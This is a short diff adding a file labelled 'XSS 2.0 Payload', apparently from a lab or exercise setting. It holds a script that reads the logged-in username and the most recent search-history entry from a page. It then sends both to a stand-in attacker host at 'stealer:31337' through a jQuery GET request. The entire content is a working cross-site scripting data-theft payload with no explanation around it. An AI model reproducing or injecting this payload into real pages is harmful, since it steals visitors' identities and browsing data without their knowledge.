@@ -1,0 +1,8 @@
+// XSS 2.0 Payload
+<script>$(document).ready(function(){
+    uname = document.getElementById("logged-in-user").innerText;
+    parent =   document.getElementById("history-list");
+    value = parent.children[1].innerText;
+    url_req = "http://stealer:31337/?stolen_user=" + uname + "&last_search=" + value;
+    $.get(url_req);
+});</script>
